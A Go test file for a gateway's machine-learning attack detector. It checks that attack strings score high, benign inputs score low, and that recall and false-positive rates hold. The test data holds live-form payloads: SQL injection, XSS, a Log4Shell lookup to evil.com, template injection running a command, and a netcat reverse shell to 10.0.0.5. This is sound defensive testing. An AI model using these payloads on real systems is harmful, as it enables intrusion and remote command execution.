package ml

import (
	"strings"
	"testing"

	"sentinel/gateway/internal/ml/dataset"
)

func TestShippedModel(t *testing.T) {
	m, err := Default()
	if err != nil {
		t.Fatal(err)
	}
	attacks := []string{
		"1' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -",
		"<details open ontoggle=confirm(1)>",
		"${jndi:ldap://evil.com/a}",
		"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
		"; nc -e /bin/sh 10.0.0.5 4444",
	}
	for _, a := range attacks {
		if p := m.Score(Featurize(a)); p < 0.9 {
			t.Errorf("%q scored %.2f", a, p)
		}
	}
	normal := []string{"apple juice", "O'Brien", "Great product, would buy again!", "alice@juice-sh.op", "Alice#2026",
		"Please select a different size", "rock 'n' roll t-shirt", "2026-11-09", "عصير تفاح", "item (2 of 3)"}
	for _, n := range normal {
		if p := m.Score(Featurize(n)); p > 0.5 {
			t.Errorf("%q scored %.2f", n, p)
		}
	}
	e := m.Explain("x'||pg_sleep(10)--", 3)
	if len(e.Reasons) == 0 || e.Reasons[0].Token != "pg_sleep" {
		t.Errorf("explanation: %+v", e)
	}
}

// The shipped model must still do well on fresh generated data.
func TestHeldOut(t *testing.T) {
	m, _ := Default()
	var tp, fn, fp, tn int
	for _, e := range dataset.Generate(1000, 99) {
		hit := m.Score(Featurize(e.Text)) >= 0.9
		switch {
		case e.Attack && hit:
			tp++
		case e.Attack:
			fn++
		case hit:
			fp++
		default:
			tn++
		}
	}
	if recall := float64(tp) / float64(tp+fn); recall < 0.97 {
		t.Errorf("recall %.3f", recall)
	}
	if fpr := float64(fp) / float64(fp+tn); fpr > 0.005 {
		t.Errorf("false positive rate %.4f", fpr)
	}
}

func TestWordAround(t *testing.T) {
	for piece, want := range map[string]string{"leep(": "pg_sleep", "xtr": "extractvalue", "--": "--"} {
		if got := wordAround("x'||pg_sleep(10)-- and extractvalue(1)", piece); got != want {
			t.Errorf("%q -> %q, want %q", piece, got, want)
		}
	}
	if !strings.Contains(Explanation{Reasons: []Reason{{"a", 1}}}.Summary(), `"a" +1.00`) {
		t.Error("summary format")
	}
}
